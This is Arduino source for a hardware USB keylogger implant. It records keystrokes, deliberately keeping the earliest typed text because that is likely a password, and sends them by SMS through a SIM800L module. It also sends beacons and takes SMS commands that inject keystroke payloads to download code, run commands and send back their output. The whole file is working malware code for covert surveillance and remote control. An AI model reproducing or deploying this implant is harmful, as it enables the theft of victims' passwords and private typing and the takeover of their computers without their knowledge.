/* NOTE: Make sure to edit SoftwareSerial.h to change 
 *  #define _SS_MAX_RX_BUFF 64 // RX buffer size
 *  to
 *  #define _SS_MAX_RX_BUFF 256 // RX buffer size
 *
 * You need to set your info in globals.h
*/
#include <SoftwareSerial.h>
#include <Keyboard.h>
#include "C_USBhost.h"
#include "Payloads.h"
#include "utils.h"
#include "globals.h"

#ifdef DEBUG
C_USBhost USBhost = C_USBhost(Serial1, 1);
#else
C_USBhost USBhost = C_USBhost(Serial1, 0);
#endif
SoftwareSerial SMSSERIAL(8, 9);

unsigned long previousMillis = 0;
unsigned long previousMillisBeacon = 0;
unsigned long previousFailSMSMillis = 0;


#ifdef DEBUG
  unsigned long interval = 3000;
#else
  unsigned long interval = 60000;
#endif
byte captured_key;
bool pendingSMS = false;
String buffer_keystrokes = "";
unsigned int pendingLength = 0;

void setup(){
  delay(3000);                                              
  Serial.begin(BAUD_RATE_SERIAL);

  Keyboard.begin();
  
#ifndef DEBUGWITHOUTSIM
  SMSSERIAL.begin(BAUD_RATE_SIM800L);
  USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                   
  SMSSERIAL.println(F("AT"));
  readResponse();

  // This is needed to prevent the keylogger to hang out when sending a SMS since the default timeout is 1 sec
  Serial.setTimeout(100);
  SMSSERIAL.setTimeout(100);

  // Selects SMS message format as text. Default format is Protocol Data Unit (PDU)
  SMSSERIAL.println(F("AT+CMGF=1"));
  readResponse();

#ifdef DEBUG
  collectDebugInfo();
#endif

#endif //DEBUGWITHOUTSIM                                        
}

void loop(){
  unsigned long currentMillis = millis();
  captured_key = USBhost.GetKey();    

  // Send a beacon so we know that the implant is up
  // ToDo: this can infere with payloads execution. Use only when user is not typing
  if (!pendingSMS && (unsigned long)((currentMillis - previousMillisBeacon)/ 60000) >= BEACON_TIME){
      String msg = F("Beacon - ");
      msg += IMPLANT_NAME;
#ifdef DEBUG
      Serial.println(F("Sending beacon"));
#endif
      sendSMSMessage(msg);
      previousMillisBeacon = currentMillis;
  }

  //Normalkey capture
  if(captured_key){
    if(captured_key == 8){ // Backspace
      if(buffer_keystrokes.length() > 0){
        buffer_keystrokes = buffer_keystrokes.substring(0, buffer_keystrokes.length() - 1);
      }
    }
    else if(captured_key >= 32){ // Ignore not printable characters
      // Arduino doesn't have a lot of memory, so we need to define a max size for the buffer
      // if more characters arrive after the buffer if full it discards them (we prioritize older 
      /// text because prob the first thing typed is the password) 
      if (buffer_keystrokes.length() <  MAX_BUFFER_SIZE)
        buffer_keystrokes += (char)captured_key;
    }
    previousMillis = currentMillis;  
  }

  //SMS send
  if (buffer_keystrokes.length() >= SMS_CHAR_LIMIT - 1 || (unsigned long)(currentMillis - previousMillis) >= interval && buffer_keystrokes.length() > 5){
    if(currentMillis - previousFailSMSMillis >  10000){ // delay 10 seconds between trying sending SMS if it failed
      if (!pendingSMS){
        // The buffer could hold a lot of characters from previous SMS that couldn't be sent
        String bufferToSend = "";
        if (buffer_keystrokes.length() < SMS_CHAR_LIMIT - 1){
          bufferToSend = buffer_keystrokes;
        }
        else{
          bufferToSend = buffer_keystrokes.substring(0, SMS_CHAR_LIMIT - 1);
        }
  #ifdef DEBUG
        Serial.print(F("Trying to send message with content: "));
        Serial.println(bufferToSend);
  #endif
        
        sendSMSMessage(bufferToSend);
        pendingSMS = true;
        pendingLength = bufferToSend.length();
      } 
      else{
  #ifdef DEBUG
        Serial.println(F("There is a SMS pending to be sent..."));
  #endif
      }
    }
  }

  // If there is a pending SMS we check if it was sent, if so we remove the characters sent
  if (pendingSMS){
    if (SMSSERIAL.available()){
      String res = SMSSERIAL.readString();
#ifdef DEBUG
      Serial.print(F("Message read from SMSSERIAL: "));
      Serial.println(res);
#endif
      if (res.indexOf(F("CMGS: ")) > 0){
#ifdef DEBUG
        Serial.println(F("SMS message succesfully sent"));
#endif
         
        SMSSerialFlush(); // just is case there is something else in the serial
        
        // We removed from the buffer the characters that were sent
        buffer_keystrokes = buffer_keystrokes.substring(pendingLength);
      }
      else if (res.indexOf(F("ERROR: "))){ // The SMS couldn't be sent, we need to retry        
#ifdef DEBUG
        Serial.print(F("ERROR trying to send message with content: "));
        Serial.println(buffer_keystrokes.substring(0, pendingLength));
#endif
        previousFailSMSMillis = currentMillis;
      }
      pendingSMS = false;
    }
  }

#ifdef DEBUGWITHOUTSIM
  if (true) {
#else
  //Payload Method Make sure keyword are unique enough that subject in question wont enter them on their keyboard.
  if (!pendingSMS && SMSSERIAL.available()){
#endif

#ifdef DEBUG
    Serial.println(F("new SMS"));
#endif

    String SMS = SMSSERIAL.readString();      
#ifdef DEBUGWITHOUTSIM
    //We wait a little bit so the OS has time to identify the keyboard
    delay(30000);
    // To simulate a real SMS:
    SMS = F("+CMT: blablabla\r\n");
    SMS += DEBUGWITHOUTSIM_PAYLOAD;
#endif

    if(SMS.indexOf(F("+CMT: ")) > -1){ // We got a command
      String SMS_text;
      // Code to remove last new line if exists
      if(SMS.charAt(SMS.length())== '\n' &&  SMS.charAt(SMS.length()-1)== '\r'){
        SMS.remove(SMS.length()-1, SMS.length());
      }
      int new_line_pos = SMS.indexOf("\r\n", 2);
      SMS_text = SMS.substring(new_line_pos +2); // +2 is bc \r\n
#ifdef DEBUG
      Serial.println(F("Received SMS with content:"));
      Serial.println(SMS_text);
#endif
      String payload = getValue(SMS_text, SEPARATOR, 0);
  
#ifdef DEBUG
      if(payload.length() > 0){
        Serial.print(F("Got payload: "));
        Serial.println(payload);
      }
#endif
      
      if (payload == F("UnlockDownload")){
        unlockDownload(SMS_text);
      }
      else if(payload == F("UnlockRunAndExfil")){
        unlockRunAndExfil(SMS_text);
      }
      else if(payload == F("Manual")){
        manualPayload(SMS_text);
      }
      else{
#ifdef DEBUG
        Serial.print(F("Unknown payload "));
        Serial.println(payload); 
#endif
        sendSMSMessage("Unknown payload '" + payload + "'\nFull message: " + SMS_text);
      }
#ifdef DEBUGWITHOUTSIM
      // After execute a fake payload it does a sleep
      delay(30000);
#endif
    }
    else {
#ifdef DEBUG
      Serial.print(F("Receive something that is not an SMS: "));
      Serial.println(SMS);
#endif
    }
  }

  // If there is anything to read from the serial port we forward it via SMSs 
  // This is used to exfil the result of commands
  if (Serial.available()) {
    String output = Serial.readString();
    sendSMSMessage("Ex:" + output);
  }
}
